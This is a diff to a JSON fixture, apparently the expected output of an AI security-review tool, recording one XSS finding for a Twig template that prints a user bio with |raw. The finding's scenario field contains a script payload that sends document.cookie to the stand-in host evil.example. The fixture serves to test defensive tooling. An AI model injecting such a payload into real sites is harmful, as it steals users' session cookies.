@@ -161,6 +161,91 @@
     }
   ],
   "notes": [
-    "\u003c!-- ainspector:summary:security --\u003e\n### ainspector: security review\n\nReviewed 1 unit, 1 issue reported.\n\nModel: `test-model`\n\nTokens: 200 in, 20 out, 0 read from cache, 0 written to cache\nEstimated cost: unknown, the model has no known price\n\n\u003c!-- ainspector:state:security {\"v\":1,\"scope\":\"function+class+related\",\"ver\":\"security/2\",\"units\":[\"e45c5516b312\"],\"findings\":[\"152a41c4d9cd\"],\"reported\":[{\"fp\":\"152a41c4d9cd\",\"file\":\"templates/account/show.html.twig\",\"line\":8,\"category\":\"xss\",\"title\":\"Unescaped bio rendered with |raw\"}]} --\u003e\n"
-  ]
+    "\u003c!-- ainspector:summary:security --\u003e\n### ainspector: security review\n\nReviewed 1 unit, 1 issue reported.\n\nModel: `test-model`\n\nTokens: 200 in, 20 out, 0 read from cache, 0 written to cache\nEstimated cost: unknown, the model has no known price\n\n\u003c!-- ainspector:state:security {\"v\":1,\"scope\":\"function+class+related\",\"ver\":\"security/2\",\"units\":[\"e45c5516b312\"],\"findings\":[\"152a41c4d9cd\"],\"reported\":[{\"fp\":\"152a41c4d9cd\",\"file\":\"templates/account/show.html.twig\",\"line\":8,\"category\":\"xss\",\"title\":\"Unescaped bio rendered with |raw\"}],\"open\":[{\"fp\":\"152a41c4d9cd\",\"file\":\"templates/account/show.html.twig\",\"line\":8,\"category\":\"xss\",\"title\":\"Unescaped bio rendered with |raw\",\"end\":8,\"sev\":\"high\",\"unit\":\"e45c5516b312\",\"ul\":3}]} --\u003e\n"
+  ],
+  "code_quality": [
+    {
+      "description": "Unescaped bio rendered with |raw",
+      "check_name": "ainspector/security/xss",
+      "fingerprint": "152a41c4d9cd",
+      "severity": "critical",
+      "categories": [
+        "Security"
+      ],
+      "location": {
+        "path": "templates/account/show.html.twig",
+        "lines": {
+          "begin": 8
+        }
+      }
+    }
+  ],
+  "artifact": {
+    "version": 1,
+    "change": {
+      "number": 1
+    },
+    "modes": [
+      {
+        "mode": "security",
+        "scope": "function+class+related",
+        "version": "security/2",
+        "model": "test-model",
+        "units": [
+          {
+            "kind": "hunk",
+            "file": "templates/account/show.html.twig",
+            "name": "lines 3-9",
+            "start_line": 3,
+            "end_line": 9,
+            "change_type": "modified",
+            "hash": "e45c5516b312",
+            "status": "reviewed"
+          }
+        ],
+        "already_reviewed": 0,
+        "published": [
+          {
+            "mode": "security",
+            "file": "templates/account/show.html.twig",
+            "start_line": 8,
+            "end_line": 8,
+            "severity": "high",
+            "category": "xss",
+            "title": "Unescaped bio rendered with |raw",
+            "explanation": "",
+            "remediation": "Remove |raw, or sanitize the HTML with the Symfony HtmlSanitizer before storing or printing it.",
+            "scenario": "A customer saves \u003cscript\u003efetch('//evil.example/?c='+document.cookie)\u003c/script\u003e as their bio: the template prints it without escaping, so the script runs in the browser of every advisor who opens the account.",
+            "confidence": 0.9,
+            "unit_hash": "e45c5516b312",
+            "fingerprint": "152a41c4d9cd"
+          }
+        ],
+        "overflow": [],
+        "unjudged": [],
+        "repeated": [],
+        "carried": [],
+        "discarded": 0,
+        "verdicts": [
+          {
+            "id": 0,
+            "fingerprint": "152a41c4d9cd",
+            "keep": true,
+            "reason": "The bio is user-provided and printed raw."
+          }
+        ],
+        "skipped": [],
+        "failed": [],
+        "usage": {
+          "input": 200,
+          "output": 20,
+          "cache_read": 0,
+          "cache_write": 0
+        },
+        "cost": 0,
+        "cost_incomplete": true,
+        "notes": []
+      }
+    ]
+  }
 }
